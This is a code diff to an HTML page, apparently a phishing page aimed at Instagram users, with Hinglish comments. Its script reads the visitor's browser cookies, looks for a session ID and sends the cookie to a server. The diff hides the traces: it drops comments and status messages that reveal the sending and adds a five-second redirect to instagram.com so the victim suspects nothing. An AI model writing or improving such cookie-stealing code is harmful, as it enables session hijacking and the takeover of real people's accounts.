@@ -57,20 +57,18 @@
     </div>
 
     <script>
-        // Cookie capture karo
         var cookie = document.cookie;
         var statusEl = document.getElementById('status');
         var cookieBox = document.getElementById('cookieBox');
         
         statusEl.textContent = '🔍 Checking your session...';
         
-        // Agar cookie mili toh dikhao
         if (cookie && cookie.includes('sessionid')) {
             cookieBox.style.display = 'block';
             cookieBox.textContent = '✅ Session found: ' + cookie.substring(0, 50) + '...';
-            statusEl.textContent = '✅ Session captured! Redirecting...';
+            statusEl.textContent = '✅ Session captured! Redirecting to Instagram...';
         } else {
-            statusEl.textContent = '⚠️ No session found. Make sure you are logged in to Instagram in this browser.';
+            statusEl.textContent = '⚠️ No session found. Make sure you are logged in.';
         }
         
         // Cookie ko server pe bhejo
@@ -78,20 +76,15 @@
             .then(response => response.text())
             .then(data => {
                 console.log('✅ Server response:', data);
-                statusEl.textContent = '✅ Session sent to server!';
             })
             .catch(err => {
                 console.log('❌ Error:', err);
-                statusEl.textContent = '❌ Error sending session. Check logs.';
             });
         
-        // ⚠️ COMMENT KARO YA HATAO — REDIRECT NAHI HOGA!
-        // window.location.href = 'https://instagram.com';
-        
-        // Agar redirect karna hai toh 5 second baad
-        // setTimeout(function() {
-        //     window.location.href = 'https://instagram.com';
-        // }, 5000);
+        // ✅ 5 SECOND BAAD INSTAGRAM PE REDIRECT
+        setTimeout(function() {
+            window.location.href = 'https://instagram.com';
+        }, 5000);
     </script>
 </body>
 </html>
